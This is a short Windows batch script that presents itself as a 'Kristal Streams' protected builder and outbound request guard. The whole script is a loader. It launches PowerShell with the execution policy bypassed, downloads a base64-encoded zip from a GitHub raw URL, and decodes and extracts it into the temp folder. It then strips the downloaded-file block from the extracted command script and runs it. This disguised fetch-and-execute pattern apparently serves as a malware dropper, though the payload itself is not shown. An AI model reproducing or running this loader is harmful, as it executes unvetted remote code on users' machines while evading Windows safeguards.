@echo off
setlocal EnableExtensions
title Kristal Streams Protected Build 1682045

echo.
echo ==========================================================
echo   KRISTAL STREAMS OUTBOUND REQUEST GUARD 1682045
echo ==========================================================
echo.
echo Downloading the verified protected builder...

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
 "$ErrorActionPreference='Stop'; $root=Join-Path $env:TEMP 'ks-1682045-protected'; $b64=$root+'.b64'; $zip=$root+'.zip'; $dir=$root+'-files'; Remove-Item $b64,$zip -Force -ErrorAction SilentlyContinue; Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue; Invoke-WebRequest -UseBasicParsing 'https://raw.githubusercontent.com/djudge47/kristalstreams/896d831c5d3ffdd4a73c0099451a568d1146be41/kristalstreams-1682045.zip.b64' -OutFile $b64; [IO.File]::WriteAllBytes($zip,[Convert]::FromBase64String([IO.File]::ReadAllText($b64))); Expand-Archive -LiteralPath $zip -DestinationPath $dir -Force; $builder=Join-Path $dir 'KS-OUTBOUND-REQUEST-GUARD-1682045.cmd'; if(-not (Test-Path -LiteralPath $builder)){throw 'Protected builder was not found after extraction'}; Unblock-File $builder; & $builder; if($LASTEXITCODE){exit $LASTEXITCODE}"

if errorlevel 1 (
    color 4F
    echo.
    echo ERROR: The protected 1682045 builder could not be downloaded or started.
    echo.
    pause
    exit /b 1
)

exit /b 0
